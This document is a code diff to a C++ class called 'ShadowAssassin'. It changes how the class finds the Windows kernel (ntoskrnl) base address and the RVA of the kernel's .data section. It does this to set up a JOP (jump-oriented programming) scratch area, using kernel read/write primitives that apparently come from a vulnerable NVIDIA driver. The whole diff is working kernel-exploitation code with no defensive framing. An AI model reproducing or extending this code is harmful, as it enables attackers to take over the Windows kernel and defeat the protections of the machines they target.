@@ -71,14 +71,47 @@ bool ShadowAssassin::Initialize() {
     frameManager.SetReadPrimitive(readFn);
     frameManager.SetWritePrimitive(writeFn);
 
+    if (!ntso_base) {
+        LPVOID drivers[1];
+        DWORD needed = 0;
+        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
+            ntso_base = (UINT64)drivers[0];
+    }
+    if (!ntso_base) {
+        DbgLog("[Initialize] FAIL: could not resolve ntoskrnl base\n");
+        return false;
+    }
+    DbgLog("[Initialize] ntso_base=0x%llX\n", ntso_base);
+
     jopManager.SetWritePrimitive(writeFn);
     jopManager.SetNvidiaBase(nvidia_base);
 
-    UINT64 dataSectionRva = GetSectionRva(".data");
-    if (!dataSectionRva) {
-        DbgLog("[Initialize] FAIL: could not resolve .data section\n");
+    wchar_t sysDir[MAX_PATH];
+    GetSystemDirectoryW(sysDir, MAX_PATH);
+
+    static const wchar_t* ntosNames[] = { L"ntkrnlmp.exe", L"ntoskrnl.exe", nullptr };
+    ImageMapping img;
+    for (int i = 0; ntosNames[i]; i++) {
+        wchar_t path[MAX_PATH];
+        swprintf_s(path, L"%s\\%s", sysDir, ntosNames[i]);
+        if (img.Open(path)) {
+            DbgLog("[Initialize] Mapped %ls\n", path);
+            break;
+        }
+    }
+    if (!img.view) {
+        DbgLog("[Initialize] FAIL: could not map kernel image from disk\n");
         return false;
     }
+
+    UINT64 dataSectionRva = GetSectionRva(img, ".data");
+    img.Close();
+
+    if (!dataSectionRva) {
+        DbgLog("[Initialize] FAIL: .data section not found in ntoskrnl image\n");
+        return false;
+    }
+
     UINT64 scratch = ntso_base + dataSectionRva + 0x80000;
     DbgLog("[Initialize] JOP scratch=0x%llX (ntso .data RVA=0x%llX + 0x80000)\n",
         scratch, dataSectionRva);
@@ -114,41 +147,21 @@ bool ShadowAssassin::Initialize() {
 
 // --- Kernel export resolution ---
 
-UINT64 ShadowAssassin::GetSectionRva(const char* sectionName) {
-    UINT64 e_lfanew = 0;
-    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
-    e_lfanew &= 0xFFFFFFFF;
+UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectionName) {
+    if (!img.view) return 0;
 
-    UINT64 numSections = 0;
-    readFn((UINT64*)&numSections, ntso_base + e_lfanew + 0x6, sizeof(USHORT));
-    numSections &= 0xFFFF;
+    auto dos = (PIMAGE_DOS_HEADER)img.view;
+    auto nt  = (PIMAGE_NT_HEADERS)((uintptr_t)img.view + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
 
-    UINT64 optHeaderSize = 0;
-    readFn((UINT64*)&optHeaderSize, ntso_base + e_lfanew + 0x14, sizeof(USHORT));
-    optHeaderSize &= 0xFFFF;
-
-    UINT64 sectionBase = ntso_base + e_lfanew + 0x18 + optHeaderSize;
-
-    for (UINT64 i = 0; i < numSections && i < 32; i++) {
-        UINT64 secAddr = sectionBase + i * 0x28;
-
-        char name[9] = {};
-        for (int c = 0; c < 8; c++) {
-            UINT64 ch = 0;
-            readFn((UINT64*)&ch, secAddr + c, 1);
-            name[c] = (char)(ch & 0xFF);
-        }
-
-        if (strcmp(name, sectionName) == 0) {
-            UINT64 rva = 0;
-            readFn((UINT64*)&rva, secAddr + 0x0C, sizeof(ULONG));
-            rva &= 0xFFFFFFFF;
-            DbgLog("[GetSectionRva] %s -> RVA=0x%llX\n", sectionName, rva);
-            return rva;
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (strncmp((const char*)sec[i].Name, sectionName, 8) == 0) {
+            DbgLog("[GetSectionRva] %s -> RVA=0x%lX\n", sectionName, sec[i].VirtualAddress);
+            return sec[i].VirtualAddress;
         }
     }
 
-    DbgLog("[GetSectionRva] FAIL: section '%s' not found\n", sectionName);
+    DbgLog("[GetSectionRva] FAIL: '%s' not found\n", sectionName);
     return 0;
 }
 
